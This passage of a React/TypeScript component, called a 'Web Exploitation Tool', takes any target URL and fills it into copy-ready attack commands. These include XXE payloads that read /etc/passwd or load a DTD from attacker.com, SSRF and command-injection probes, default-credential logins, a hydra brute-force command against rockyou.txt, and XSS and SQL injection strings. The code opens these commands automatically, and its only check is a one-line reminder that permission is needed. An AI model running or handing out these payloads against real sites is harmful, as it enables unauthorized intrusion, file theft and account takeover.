      },
      {
        name: "XML External Entity (XXE) Injection",
        description: "XML parsers process external entity references within XML, potentially leading to file disclosure, SSRF, or DoS.",
        severity: "high",
        recommendation: "Disable external entities in XML parsers and use less complex data formats like JSON when possible.",
        references: ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
        category: "Injection",
        exploitCommands: [
          {
            description: "Test for XXE - basic file read",
            command: "curl -s -X POST -H \"Content-Type: application/xml\" -d '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>' [TARGET_URL]/api/xml",
            tool: "cURL"
          },
          {
            description: "Test for XXE - SSRF",
            command: "curl -s -X POST -H \"Content-Type: application/xml\" -d '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY ssrf SYSTEM \"http://internal-service:8080/\">]><data>&ssrf;</data>' [TARGET_URL]/api/xml",
            tool: "cURL"
          },
          {
            description: "Test for blind XXE with out-of-band detection",
            command: "curl -s -X POST -H \"Content-Type: application/xml\" -d '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><data>test</data>' [TARGET_URL]/api/xml",
            tool: "cURL"
          }
        ]
      },
      {
        name: "Server-Side Request Forgery (SSRF)",
        description: "The application can be tricked into making server-side requests to internal resources or external systems.",
        severity: "high",
        recommendation: "Implement whitelisting of allowed URLs and domains. Block requests to internal ranges and localhost.",
        references: ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
        category: "Network Security",
        exploitCommands: [
          {
            description: "Test for SSRF to internal service",
            command: "curl -s \"[TARGET_URL]/fetch?url=http://localhost:8080/\"",
            tool: "cURL"
          },
          {
            description: "Test SSRF with IP encoding variations",
            command: "curl -s \"[TARGET_URL]/fetch?url=http://127.0.0.1/\"",
            tool: "cURL"
          },
          {
            description: "Test SSRF with decimal IP",
            command: "curl -s \"[TARGET_URL]/fetch?url=http://2130706433/\"",
            tool: "cURL"
          },
          {
            description: "Use SSRF scanner",
            command: "ssrfmap.py -u \"[TARGET_URL]/fetch?url=FUZZ\" -m readfiles",
            tool: "SSRFmap"
          }
        ]
      },
      {
        name: "Command Injection",
        description: "User input is not properly sanitized before being used in system commands, allowing attackers to execute arbitrary commands.",
        severity: "critical",
        recommendation: "Avoid using system commands with user input. If necessary, implement strict input validation and use allowlists.",
        references: ["https://owasp.org/www-community/attacks/Command_Injection"],
        category: "Injection",
        exploitCommands: [
          {
            description: "Test basic command injection",
            command: "curl -s \"[TARGET_URL]/ping.php?ip=127.0.0.1;id\"",
            tool: "cURL"
          },
          {
            description: "Test with different separators",
            command: "curl -s \"[TARGET_URL]/ping.php?ip=127.0.0.1|id\"",
            tool: "cURL"
          },
          {
            description: "Test with backticks",
            command: "curl -s \"[TARGET_URL]/ping.php?ip=127.0.0.1\\`id\\`\"",
            tool: "cURL"
          },
          {
            description: "Test with encoded characters",
            command: "curl -s \"[TARGET_URL]/ping.php?ip=127.0.0.1%0Aid\"",
            tool: "cURL"
          },
          {
            description: "Use blind command injection with time delay",
            command: "curl -s \"[TARGET_URL]/ping.php?ip=127.0.0.1;sleep+10\"",
            tool: "cURL"
          },
          {
            description: "Use commix for advanced testing",
            command: "commix --url=\"[TARGET_URL]/ping.php?ip=INJECT_HERE\" --batch",
            tool: "Commix"
          }
        ]
      },
      {
        name: "Broken Authentication",
        description: "Applications with flawed authentication may allow account takeover, credential stuffing, or session hijacking.",
        severity: "high",
        recommendation: "Use modern authentication frameworks. Implement MFA, account lockouts, and strong password policies.",
        references: ["https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication"],
        category: "Authentication",
        exploitCommands: [
          {
            description: "Test for default credentials",
            command: "curl -s -X POST \"[TARGET_URL]/login\" -d \"username=admin&password=admin\"",
            tool: "cURL"
          },
          {
            description: "Check password reset functionality",
            command: "curl -s \"[TARGET_URL]/reset-password?user=admin\"",
            tool: "cURL"
          },
          {
            description: "Test for session fixation",
            command: "curl -s -I \"[TARGET_URL]/login\" | grep -i \"set-cookie\"",
            tool: "cURL"
          },
          {
            description: "Use hydra for brute force",
            command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt [TARGET_URL] http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\"",
            tool: "Hydra"
          }
        ]
      }
    ]
  };

  // Analyze URL and extract useful information
  const analyzeUrl = (url: string) => {
    try {
      const parsedUrl = new URL(url);
      return {
        hostname: parsedUrl.hostname,
        path: parsedUrl.pathname,
        protocol: parsedUrl.protocol,
        isValid: true
      };
    } catch (e) {
      return { isValid: false };
    }
  };

  // Function to detect technologies based on response
  const detectTechnologies = async (url: string): Promise<string[]> => {
    try {
      // For browser limitations, we'll use a CORS proxy
      const corsProxy = "https://api.allorigins.win/raw?url=";
      const response = await fetch(`${corsProxy}${encodeURIComponent(url)}`);
      
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      
      const html = await response.text();
      const headers: Record<string, string> = {};
      response.headers.forEach((value, key) => {
        headers[key.toLowerCase()] = value;
      });
      
      // Extract generator meta tags
      const generatorPattern = /<meta\s+name=["']generator["']\s+content=["']([^"']*)["']/i;
      const generatorMatch = html.match(generatorPattern);
      const generator = generatorMatch ? generatorMatch[1] : '';
      
      // Detect technologies based on patterns
      const detectedTech: string[] = ['general']; // Always include general checks
      
      for (const [tech, info] of Object.entries(techDetectionPatterns)) {
        let detected = false;
        
        for (const pattern of info.patterns) {
          if (pattern.type === 'header' && 'key' in pattern && 'value' in pattern && 
              headers[pattern.key] && pattern.value.test(headers[pattern.key])) {
            detected = true;
            break;
          }
          else if (pattern.type === 'content' && 'pattern' in pattern && pattern.pattern.test(html)) {
            detected = true;
            break;
          }
          else if (pattern.type === 'path' && 'pattern' in pattern && pattern.pattern.test(url)) {
            detected = true;
            break;
          }
          else if (pattern.type === 'generator' && 'pattern' in pattern && generator && pattern.pattern.test(generator)) {
            detected = true;
            break;
          }
        }
        
        if (detected) {
          detectedTech.push(tech);
        }
      }
      
      return detectedTech;
    } catch (error) {
      console.error("Error detecting technologies:", error);
      return ['general']; // Fallback to general checks
    }
  };

  const analyzeWebsite = async () => {
    if (!targetUrl) {
      toast({
        title: "URL Required",
        description: "Please enter a target URL to analyze.",
        variant: "destructive",
      });
      return;
    }

    // Normalize URL
    let url = targetUrl;
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    
    // Validate URL format
    const urlInfo = analyzeUrl(url);
    if (!urlInfo.isValid) {
      toast({
        title: "Invalid URL",
        description: "Please enter a valid URL (e.g., example.com).",
        variant: "destructive",
      });
      return;
    }

    setIsScanning(true);
    setError(null);
    setScanResults(null);

    try {
      // Real technology detection (or simulated for demo)
      const detectedTech = await detectTechnologies(url);
      console.log("Detected technologies:", detectedTech);
      
      // Generate vulnerability recommendations based on detected technologies
      const vulnerabilities: Vulnerability[] = [];
      
      detectedTech.forEach(tech => {
        if (vulnerabilityDatabase[tech]) {
          vulnerabilities.push(...vulnerabilityDatabase[tech]);
        }
      });
      
      // Always include general vulnerabilities regardless of detected technologies
      // This ensures users always get exploit recommendations even if tech detection fails
      if (vulnerabilityDatabase['general']) {
        vulnerabilities.push(...vulnerabilityDatabase['general']);
      }
      
      // Remove duplicates and sort by severity
      const uniqueVulnerabilities = Array.from(new Map(
        vulnerabilities.map(v => [v.name, v])
      ).values());
      
      const sortedVulnerabilities = uniqueVulnerabilities.sort((a, b) => {
        const severityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
        return severityOrder[a.severity] - severityOrder[b.severity];
      });
      
      const result: ScanResult = {
        url: url,
        timestamp: new Date().toISOString(),
        vulnerabilities: sortedVulnerabilities,
        technologies: detectedTech.map(tech => techDetectionPatterns[tech]?.name || tech)
      };
      
      setScanResults(result);
      
      // Automatically expand vulnerability sections to show exploit commands
      setTimeout(() => {
        const accordionElements = document.querySelectorAll('[data-state="closed"]');
        accordionElements.forEach(elem => {
          if (elem.getAttribute('data-orientation') === 'vertical') {
            (elem as HTMLElement).click();
          }
        });
      }, 500);
      
      toast({
        title: "Scan Complete",
        description: `Found ${sortedVulnerabilities.length} potential vulnerabilities based on detected technologies.`,
        variant: sortedVulnerabilities.length > 0 ? "destructive" : "default",
      });
    } catch (err) {
      console.error("Error scanning website:", err);
      
      // Even if scan fails, provide some common exploit commands
      const fallbackVulnerabilities = vulnerabilityDatabase['general'];
      
      if (fallbackVulnerabilities) {
        const result: ScanResult = {
          url: url,
          timestamp: new Date().toISOString(),
          vulnerabilities: fallbackVulnerabilities,
          technologies: ['Unknown']
        };
        
        setScanResults(result);
        
        toast({
          title: "Scan Partially Complete",
          description: "Technology detection failed, but showing general exploit techniques.",
          variant: "default",
        });
      } else {
        setError("Failed to scan the website. This could be due to CORS restrictions or the site being unavailable.");
        toast({
          title: "Scan Failed",
          description: "There was an error analyzing the target website.",
          variant: "destructive",
        });
      }
    } finally {
      setIsScanning(false);
    }
  };

  const handleReset = () => {
    setTargetUrl('');
    setScanResults(null);
    setError(null);
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied to clipboard",
      description: "The content has been copied to your clipboard.",
    });
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return 'bg-red-900 text-white';
      case 'high': return 'bg-red-700 text-white';
      case 'medium': return 'bg-orange-600 text-white';
      case 'low': return 'bg-yellow-600 text-white';
      default: return 'bg-gray-600 text-white';
    }
  };

  const groupVulnerabilitiesByCategory = (vulnerabilities: Vulnerability[]): Record<string, Vulnerability[]> => {
    return vulnerabilities.reduce((groups, vuln) => {
      const category = vuln.category || 'Other';
      if (!groups[category]) {
        groups[category] = [];
      }
      groups[category].push(vuln);
      return groups;
    }, {} as Record<string, Vulnerability[]>);
  };

  return (
    <div className="animate-fade-up w-full max-w-3xl mx-auto">
      <div className="cyber-panel p-6">
        <div className="flex items-center mb-6">
          <Bug className="mr-2 h-6 w-6 text-cyber-blue" />
          <h2 className="text-xl font-bold flex-1">Web Exploitation Tool</h2>
          <Button
            variant="outline"
            size="sm"
            className="text-xs"
            onClick={handleReset}
          >
            <RotateCcw className="mr-1 h-3 w-3" />
            Reset
          </Button>
        </div>

        <Alert className="mb-4 border-cyber-blue/30 bg-cyber-blue/5">
          <AlertCircle className="h-4 w-4" />
          <AlertTitle>Important Note</AlertTitle>
          <AlertDescription>
            This tool provides recommendations for potential exploits based on detected technologies.
            Always conduct security testing with proper authorization. Unauthorized testing may be illegal.
          </AlertDescription>
        </Alert>

        <div className="space-y-6">
          <div className="flex space-x-2">
            <div className="flex-1">
              <Label htmlFor="targetUrl" className="text-sm mb-2 block text-gray-300">
                Target URL
              </Label>
              <Input
                id="targetUrl"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="example.com"
                className="font-mono"
                onKeyPress={(e) => {
                  if (e.key === 'Enter') {
                    analyzeWebsite();
                  }
                }}
              />
            </div>
            <div className="pt-8">
              <Button
                onClick={analyzeWebsite}
                disabled={isScanning}
                className="bg-cyber-blue hover:bg-cyber-blue/80 h-10"
              >
                {isScanning ? (
                  <>
                    <div className="animate-spin h-4 w-4 border-2 border-white border-opacity-50 border-t-white rounded-full mr-2" />
                    Scanning...
                  </>
                ) : (
                  <>
                    <Search className="h-4 w-4 mr-2" />
                    Find Exploits
                  </>
                )}
              </Button>
            </div>
          </div>
          
          {error && (
            <Alert variant="destructive" className="mt-4">
              <AlertCircle className="h-4 w-4" />
              <AlertTitle>Error</AlertTitle>
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}
          
          {isScanning && (
            <div className="space-y-4 mt-4">
              <div className="flex items-center gap-2">
                <Skeleton className="h-4 w-4 rounded-full" />
                <Skeleton className="h-4 w-32" />
              </div>
              <Skeleton className="h-24 w-full" />
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <Skeleton className="h-40 w-full" />
                <Skeleton className="h-40 w-full" />
              </div>
            </div>
          )}
          
          {scanResults && (
            <div className="space-y-6 mt-4">
              <div className="flex flex-wrap items-center gap-2 mb-4">
                <h3 className="text-lg font-medium">Technologies Detected:</h3>
                {scanResults.technologies?.map((tech, i) => (
                  <Badge key={i} variant="outline" className="capitalize">
                    {tech}
                  </Badge>
                ))}
              </div>
              
              <Card className="bg-cyber-darker border border-cyber-blue/20 mb-4">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm">Quick Exploitation Guide</CardTitle>
                  <CardDescription>
                    Ready-to-use commands for {targetUrl} - copy and adjust as needed
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    <div className="text-xs">
                      <p className="font-medium mb-1 text-cyber-blue">Initial reconnaissance:</p>
                      <div className="bg-black/70 p-2 rounded font-mono">
                        <div className="flex items-center justify-between">
                          <code>curl -I {scanResults.url}</code>
                          <Button 
                            variant="ghost" 
                            size="sm" 
                            className="h-5 px-2" 
                            onClick={() => handleCopy(`curl -I ${scanResults.url}`)}
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </div>
                    </div>
                    
                    <div className="text-xs">
                      <p className="font-medium mb-1 text-cyber-blue">Basic XSS test:</p>
                      <div className="bg-black/70 p-2 rounded font-mono">
                        <div className="flex items-center justify-between">
                          <code>{`${scanResults.url}/search?q=<script>alert('XSS')</script>`}</code>
                          <Button 
                            variant="ghost" 
                            size="sm" 
                            className="h-5 px-2" 
                            onClick={() => handleCopy(`${scanResults.url}/search?q=<script>alert('XSS')</script>`)}
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </div>
                    </div>
                    
                    <div className="text-xs">
                      <p className="font-medium mb-1 text-cyber-blue">Basic SQL injection test:</p>
                      <div className="bg-black/70 p-2 rounded font-mono">
                        <div className="flex items-center justify-between">
                          <code>{`${scanResults.url}/product?id=1' OR '1'='1`}</code>
                          <Button 
                            variant="ghost" 
                            size="sm" 
                            className="h-5 px-2" 
                            onClick={() => handleCopy(`${scanResults.url}/product?id=1' OR '1'='1`)}
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
              
              {scanResults.vulnerabilities.length > 0 ? (
                <Tabs defaultValue="by-severity" className="w-full">
                  <TabsList className="grid w-full grid-cols-2">
                    <TabsTrigger value="by-severity">By Severity</TabsTrigger>
                    <TabsTrigger value="by-category">By Category</TabsTrigger>
                  </TabsList>
                  
                  <TabsContent value="by-severity" className="mt-4">
                    {['critical', 'high', 'medium', 'low'].map(severity => {
                      const vulnsWithSeverity = scanResults.vulnerabilities.filter(v => v.severity === severity);
                      if (vulnsWithSeverity.length === 0) return null;
                      
                      return (
                        <div key={severity} className="mb-6">
                          <div className={`inline-flex items-center px-3 py-1 rounded-md ${getSeverityColor(severity)} mb-3 uppercase text-xs font-bold`}>
                            <ShieldAlert className="h-3 w-3 mr-1" />
                            {severity} Severity
                          </div>
                          
                          <div className="space-y-4">
                            {vulnsWithSeverity.map((vuln, i) => (
                              <Card key={i} className="bg-cyber-darker border border-cyber-dark">
                                <CardHeader className="pb-2">
                                  <div className="flex justify-between items-start">
                                    <CardTitle className="text-lg">{vuln.name}</CardTitle>
                                    <Button 
                                      variant="ghost" 
                                      size="sm" 
                                      className="h-6 px-2 text-xs"
                                      onClick={() => handleCopy(`${vuln.name}\n\nDescription: ${vuln.description}\n\nRecommendation: ${vuln.recommendation}`)}
                                    >
                                      <Copy className="h-3 w-3 mr-1" /> Copy
                                    </Button>
                                  </div>
                                  <CardDescription>{vuln.description}</CardDescription>
                                </CardHeader>
                                <CardContent>
                                  <div className="text-sm">
                                    <p className="font-medium text-gray-300 mb-1">Recommendation:</p>
                                    <p className="text-gray-400 mb-3">{vuln.recommendation}</p>
                                    
                                    {vuln.exploitCommands && vuln.exploitCommands.length > 0 && (
                                      <div className="mb-3">
                                        <Accordion type="single" collapsible className="w-full" defaultValue="commands">
                                          <AccordionItem value="commands" className="border-cyber-blue/20">
                                            <AccordionTrigger className="text-cyber-blue hover:text-cyber-blue/80 py-2">
                                              <div className="flex items-center">
                                                <Terminal className="h-3 w-3 mr-2" />
                                                <span>Exploitation Commands</span>
                                              </div>
                                            </AccordionTrigger>
                                            <AccordionContent>
                                              <div className="space-y-3 mt-2">
                                                {vuln.exploitCommands.map((cmd, cmdIndex) => (
                                                  <div key={cmdIndex} className="bg-black/50 p-3 rounded border border-cyber-blue/20">
                                                    <div className="flex justify-between items-start mb-1">
                                                      <span className="text-xs text-gray-400">{cmd.description}</span>
                                                      <Badge variant="outline" className="text-[10px] h-5">
                                                        {cmd.tool}
                                                      </Badge>
                                                    </div>
                                                    <div className="flex items-center justify-between mt-1 bg-black/60 p-2 rounded font-mono text-xs overflow-x-auto">
                                                      <code className="text-cyber-blue">
                                                        {cmd.command.replace('[TARGET_URL]', scanResults.url)}
                                                      </code>
                                                      <Button 
                                                        variant="ghost" 
                                                        size="sm"
                                                        className="h-6 ml-2 flex-shrink-0"
                                                        onClick={() => handleCopy(cmd.command.replace('[TARGET_URL]', scanResults.url))}
                                                      >
                                                        <Copy className="h-3 w-3" />
                                                      </Button>
                                                    </div>
                                                  </div>
                                                ))}
                                                <p className="text-xs text-yellow-400 mt-2 flex items-start">
                                                  <AlertCircle className="h-3 w-3 mr-1 mt-0.5 flex-shrink-0" />
                                                  Replace placeholders like [API_TOKEN] with actual values. Always ensure you have permission before running these commands.
                                                </p>
                                              </div>
                                            </AccordionContent>
                                          </AccordionItem>
                                        </Accordion>
                                      </div>
                                    )}
                                    
                                    {vuln.references.length > 0 && (
                                      <div className="text-xs">
                                        <p className="font-medium text-gray-300 mb-1">References:</p>
                                        <ul className="list-disc pl-5 space-y-1">
                                          {vuln.references.map((ref, i) => (
                                            <li key={i}>
                                              <a 
                                                href={ref} 
                                                target="_blank" 
                                                rel="noopener noreferrer"
                                                className="text-cyber-blue hover:underline flex items-center"
                                              >
                                                {new URL(ref).hostname} <ExternalLink className="h-3 w-3 ml-1" />
                                              </a>
                                            </li>
                                          ))}
                                        </ul>
                                      </div>
                                    )}
                                  </div>
                                </CardContent>
                              </Card>
                            ))}
                          </div>
                        </div>
                      );
                    })}
                  </TabsContent>
                  
                  <TabsContent value="by-category" className="mt-4">
                    {Object.entries(groupVulnerabilitiesByCategory(scanResults.vulnerabilities)).map(([category, vulns]) => (
                      <div key={category} className="mb-6">
                        <h3 className="text-lg font-semibold mb-3">{category}</h3>
                        <div className="space-y-4">
                          {vulns.map((vuln, i) => (
                            <Card key={i} className="bg-cyber-darker border border-cyber-dark">
                              <CardHeader className="pb-2">
                                <div className="flex justify-between items-start">
                                  <div>
                                    <CardTitle className="text-lg">{vuln.name}</CardTitle>
                                    <Badge className={`mt-1 ${getSeverityColor(vuln.severity)}`}>
                                      {vuln.severity}
                                    </Badge>
                                  </div>
                                  <Button 
                                    variant="ghost" 
                                    size="sm" 
                                    className="h-6 px-2 text-xs"
                                    onClick={() => handleCopy(`${vuln.name}\n\nDescription: ${vuln.description}\n\nRecommendation: ${vuln.recommendation}`)}
                                  >
                                    <Copy className="h-3 w-3 mr-1" /> Copy
                                  </Button>
                                </div>
                                <CardDescription className="mt-2">{vuln.description}</CardDescription>
                              </CardHeader>
                              <CardContent>
                                <div className="text-sm">
                                  <p className="font-medium text-gray-300 mb-1">Recommendation:</p>
                                  <p className="text-gray-400 mb-3">{vuln.recommendation}</p>
                                  
                                  {vuln.exploitCommands && vuln.exploitCommands.length > 0 && (
                                    <div className="mb-3">
                                      <Accordion type="single" collapsible className="w-full" defaultValue="commands">
                                        <AccordionItem value="commands" className="border-cyber-blue/20">
                                          <AccordionTrigger className="text-cyber-blue hover:text-cyber-blue/80 py-2">
                                            <div className="flex items-center">
                                              <Code className="h-3 w-3 mr-2" />
                                              <span>Exploitation Commands</span>
                                            </div>
                                          </AccordionTrigger>
                                          <AccordionContent>
                                            <div className="space-y-3 mt-2">
                                              {vuln.exploitCommands.map((cmd, cmdIndex) => (
                                                <div key={cmdIndex} className="bg-black/50 p-3 rounded border border-cyber-blue/20">
                                                  <div className="flex justify-between items-start mb-1">
                                                    <span className="text-xs text-gray-400">{cmd.description}</span>
                                                    <Badge variant="outline" className="text-[10px] h-5">
                                                      {cmd.tool}
                                                    </Badge>
                                                  </div>
                                                  <div className="flex items-center justify-between mt-1 bg-black/60 p-2 rounded font-mono text-xs overflow-x-auto">
                                                    <code className="text-cyber-blue">
                                                      {cmd.command.replace('[TARGET_URL]', scanResults.url)}
                                                    </code>
                                                    <Button 
                                                      variant="ghost" 
                                                      size="sm"
                                                      className="h-6 ml-2 flex-shrink-0"
                                                      onClick={() => handleCopy(cmd.command.replace('[TARGET_URL]', scanResults.url))}
                                                    >
                                                      <Copy className="h-3 w-3" />
                                                    </Button>
                                                  </div>
                                                </div>
                                              ))}
                                              <p className="text-xs text-yellow-400 mt-2 flex items-start">
                                                <AlertCircle className="h-3 w-3 mr-1 mt-0.5 flex-shrink-0" />
                                                Replace placeholders like [API_TOKEN] with actual values. Always ensure you have permission before running these commands.
                                              </p>
                                            </div>
                                          </AccordionContent>
                                        </AccordionItem>
                                      </Accordion>
                                    </div>
                                  )}
                                  
                                  {vuln.references.length > 0 && (
                                    <div className="text-xs">
                                      <p className="font-medium text-gray-300 mb-1">References:</p>
                                      <ul className="list-disc pl-5 space-y-1">
                                        {vuln.references.map((ref, i) => (
                                          <li key={i}>
                                            <a 
                                              href={ref} 
                                              target="_blank" 
                                              rel="noopener noreferrer"
                                              className="text-cyber-blue hover:underline flex items-center"
                                            >
                                              {new URL(ref).hostname} <ExternalLink className="h-3 w-3 ml-1" />
                                            </a>
                                          </li>
                                        ))}
                                      </ul>
                                    </div>
                                  )}
                                </div>
                              </CardContent>
                            </Card>
                          ))}
                        </div>
                      </div>
                    ))}
                  </TabsContent>
                </Tabs>
              ) : (
                <Alert className="mt-4 bg-green-900/30 border border-green-500/50">
                  <AlertCircle className="h-4 w-4 text-green-400" />
                  <AlertTitle className="text-green-400">No Vulnerabilities Detected</AlertTitle>
                  <AlertDescription>
                    No obvious vulnerabilities were detected for this website. However, this doesn't guarantee 
                    the site is secure. Consider a more in-depth security assessment.
                  </AlertDescription>
                </Alert>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default WebExploitTool;
